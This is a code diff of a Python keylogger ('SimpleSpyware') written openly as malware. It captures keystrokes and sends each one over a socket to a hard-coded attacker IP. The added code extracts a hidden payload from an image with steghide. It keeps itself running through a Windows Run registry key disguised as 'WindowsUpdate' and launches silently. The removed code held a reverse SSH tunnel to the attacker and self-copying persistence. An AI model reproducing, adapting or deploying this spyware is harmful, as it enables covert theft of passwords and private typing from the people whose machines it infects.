@@ -2,40 +2,57 @@ import os
 import shutil
 import socket
 import logging
-import paramiko  # SSH library
+import subprocess  # For running commands
 import pyxhook  # For keylogging
-import daemon   # For running in the background
-
+import winreg  # For setting auto-startup
+from pathlib import Path
 
 class Keylogger:
     def __init__(self, name):
         self._name = name
+        self.target_path = self.get_dynamic_path("keylogger.py")
 
-    @property
-    def name(self):
-        return self._name
+    def get_dynamic_path(self, filename):
+        """ Get a universally accessible directory to store the keylogger. """
+        base_dir = os.getenv("APPDATA")  # Gets AppData\Roaming directory
+        if not base_dir:
+            base_dir = os.getenv("TEMP")  # Fallback to Temp directory
+        return os.path.join(base_dir, filename)
 
-    @name.setter
-    def name(self, new_name):
-        self._name = new_name
+    def extract_keylogger(self, source_image, passphrase):
+        """ Extract keylogger.py from the image file using steghide """
+        try:
+            extract_command = f'steghide extract -sf "{source_image}" -p "{passphrase}" -xf "{self.target_path}"'
+            subprocess.run(extract_command, shell=True, check=True)
+            print("[*] Keylogger extracted successfully.")
+        except Exception as e:
+            print(f"[!] Failed to extract keylogger: {e}")
+
+    def add_to_startup(self):
+        """ Add the keylogger to Windows startup """
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            name = "WindowsUpdate"  # Fake name to avoid suspicion
+            value = f'pythonw "{self.target_path}"'
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, value)
+            print("[*] Added to startup successfully.")
+        except Exception as e:
+            print(f"[!] Failed to add to startup: {e}")
 
     def start_logging(self):
-        """ Start capturing key strokes. """
         hook_manager = pyxhook.HookManager()
         hook_manager.KeyDown = self._keydown_callback
         hook_manager.HookKeyboard()
         hook_manager.start()
 
     def _keydown_callback(self, key):
-        """ Handle key stroke event. """
-        try:
-            logging.debug(chr(key.Ascii))  # Log the key stroke
-            self.send_log(chr(key.Ascii))  # Send the log to the attacker
-        except Exception as e:
-            logging.error(f"Error in keydown callback: {e}")
+        logging.debug(chr(key.Ascii))
+        self.send_log(chr(key.Ascii))
 
     def send_log(self, log_data):
-        """ Send log data to the attacker’s machine. """
+        """ Send log data to the attacker's machine """
         host = '192.168.26.129'  # Attacker's IP address
         port = 9999  # Port to send data through
         try:
@@ -46,62 +63,20 @@ class Keylogger:
         except Exception as e:
             logging.error(f"Error sending logs: {e}")
 
-    def establish_reverse_ssh_tunnel(self):
-        """ Establish reverse SSH tunnel to attacker’s machine. """
-        attacker_ip = '192.168.26.129'  # Attacker's machine IP
-        attacker_port = 9999  # Port on attacker’s machine to forward traffic to
-
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically accept unknown host keys
-
-        try:
-            ssh_client.connect(attacker_ip, username='kali', password='kali')
-            ssh_client.get_transport().request_port_forward('localhost', attacker_port)
-            print("Reverse SSH tunnel established.")
-        except Exception as e:
-            logging.error(f"Failed to establish SSH tunnel: {e}")
-        finally:
-            ssh_client.close()
-
-
-def copy_keylogger():
-    """ Copy the keylogger script to a persistent location. """
-    source_path = __file__  # The current script's path
-    home_dir = os.getenv('USERPROFILE') or os.getenv('HOME')  # User's home directory
-    target_dir = os.path.join(home_dir, "Documents")  # Default target directory
-
-    if not os.path.exists(target_dir):
-        target_dir = home_dir  # Fallback to home directory if Documents doesn't exist
-
-    target_path = os.path.join(target_dir, "keylogger.py")  # Final target path
-
-    try:
-        shutil.copy(source_path, target_path)
-        print(f"Keylogger copied to {target_path}")
-    except Exception as e:
-        logging.error(f"Failed to copy keylogger: {e}")
-
-    # Optionally add the script to startup (Windows example)
-    try:
-        if os.name == 'nt':  # Windows
-            startup_dir = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-            startup_script = os.path.join(startup_dir, "keylogger.pyw")  # Use .pyw for no console
-            shutil.copy(target_path, startup_script)
-            print(f"Keylogger added to startup: {startup_script}")
-    except Exception as e:
-        logging.error(f"Failed to add keylogger to startup: {e}")
-
-
 if __name__ == '__main__':
-    # Copy the keylogger to a persistent location
-    copy_keylogger()
-
-    # Set up logging
     logging.basicConfig(level=logging.DEBUG, filename='activity.log', format='Key: %(message)s')
-    handler = logging.getLogger().handlers[0].stream
 
-    # Daemonize the process to hide it
-    with daemon.DaemonContext(files_preserve=[handler]):
-        keylogger = Keylogger('SimpleSpyware')
-        keylogger.start_logging()
-        keylogger.establish_reverse_ssh_tunnel()  # Establish SSH tunnel
+    # Step 1: Extract keylogger from image
+    source_image = "LEGION.jpg"  # Ensure this file is in the same directory
+    passphrase = "unknown2473"
+    keylogger = Keylogger('SimpleSpyware')
+    keylogger.extract_keylogger(source_image, passphrase)
+
+    # Step 2: Add keylogger to startup
+    keylogger.add_to_startup()
+
+    # Step 3: Execute the keylogger
+    if os.path.exists(keylogger.target_path):
+        os.system(f'pythonw "{keylogger.target_path}"')  # Execute the keylogger in the background
+    else:
+        print("[!] Keylogger file not found.")
